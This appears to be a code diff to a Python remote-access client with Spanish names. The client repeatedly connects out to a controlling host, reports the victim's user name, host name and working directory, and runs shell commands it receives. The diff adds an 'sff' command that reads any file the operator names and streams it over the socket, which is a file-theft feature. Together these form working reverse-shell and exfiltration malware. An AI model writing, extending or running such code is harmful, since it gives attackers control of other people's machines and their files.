@@ -1,6 +1,7 @@
 import socket
 import os
 import getpass
+import re
 from time import sleep
 from subprocess import Popen, PIPE
 
@@ -18,7 +19,7 @@ class TCP:
                 self.__sock.connect((self.__host, self.__port))
                 self.__chunk = int(self.__sock.recv(1024).decode())
 
-                sleep(0.1)
+                sleep(0.05)
                 userName = getpass.getuser()
                 hostName = socket.gethostname()
                 currentDir = os.getcwd()
@@ -30,6 +31,26 @@ class TCP:
             except:
                 sleep(5)
 
+    def getNombre(self, ubicacion):
+        nombre = os.path.abspath(ubicacion)
+        nombre = os.path.basename(nombre)
+        return nombre
+
+    def enviarArchivo(self, ubicacion):
+        sleep(0.1)
+        tam = os.path.getsize(ubicacion)
+        paquetes = str(int(tam/self.__chunk))
+        self.__sock.send(paquetes.encode())
+
+        sleep(0.1)
+        with open(ubicacion, 'rb') as archivo:
+            info = archivo.read(self.__chunk)
+            while info:
+                self.__sock.send(info)
+                info = archivo.read(self.__chunk)
+                sleep(0.05)
+        archivo.close()
+
     def cd(self, directorio):
         if os.path.isdir(directorio):
             os.chdir(directorio)
@@ -37,6 +58,31 @@ class TCP:
 
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
+
+    def sendFileFrom(self, cmd):
+        if re.search("-d", cmd):
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+
+            if os.path.isfile(origen):
+                self.__sock.send("ok".encode())
+                self.enviarArchivo(origen)
+
+            else:
+                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
+
+        else:
+            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+
+            if os.path.isfile(origen):
+                self.__sock.send("ok".encode())
+                nombre = self.getNombre(origen)
+
+                sleep(0.05)
+                self.__sock.send(nombre.encode())
+                self.enviarArchivo(origen)
+
+            else:
+                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
     def shell(self):
         try:
@@ -63,12 +109,15 @@ class TCP:
                     try:
                         self.cd(cmd[3:])
 
-                        sleep(0.1)
-                        self.__sock.send("ok (cd)".encode())
+                    except:
+                        continue
+
+                elif cmd.lower()[:3] == "sff":
+                    try:
+                        self.sendFileFrom(cmd)
 
                     except:
-                        sleep(0.1)
-                        self.__sock.send("exception (cd)".encode())
+                        continue
 
                 else:
                     try:
